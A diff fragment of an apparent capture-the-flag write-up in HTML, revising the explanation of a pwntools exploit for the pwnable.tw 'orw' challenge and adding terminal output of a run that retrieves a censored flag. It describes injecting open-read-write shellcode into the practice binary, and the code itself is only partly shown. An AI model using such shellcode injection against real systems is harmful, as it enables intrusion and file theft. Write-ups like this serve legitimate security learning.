@@ -115,8 +115,23 @@ r.send(sc)
 r.interactive()</code>
 </pre>
 
-<p>The above Python script uses <code>pwntools</code> to connect to the target and inject shellcode that opens, reads, and outputs the flag from <code>/home/orw/flag</code>, which is the goal of this challenge. This demonstrates the practical exploitation of the identified vulnerabilities in the <code>orw binary</code>.</p>
-    </div>
+<p>The exploit basically establishes a connection to a remote service and sends shellcode that, when executed, opens a file containing the flag, reads its contents, and writes it to standard output. The flag is then captured and displayed. The use of shellcode and direct stack manipulation makes the exploit possible and efficient.</p>
+</div>
+
+<h2>Flag</h2>
+
+<pre>
+<code>(myenv) [untw@untw exploit]$ /usr/bin/env /home/untw/exploit/myenv/bin/python /home/untw/.vscode/extensions/ms-python.debugpy-2024.10.0-linux-x64/bundled/libs/debugpy/adapter/../../debugpy/launcher 48153 -- /home/untw/exploit/orw/exploit-orw.py 
+[+] Opening connection to chall.pwnable.tw on port 10001: Done
+[+] Flag: FLAG{censored}
+[*] Switching to interactive mode
+        
+\xf7\x00\x10u\xf7\x00\x00\x00\x007\x96[*] Got EOF while reading in interactive
+$</code>
+</pre>
+</div>
+</body>
+</html>
 </body>
 </html>
 
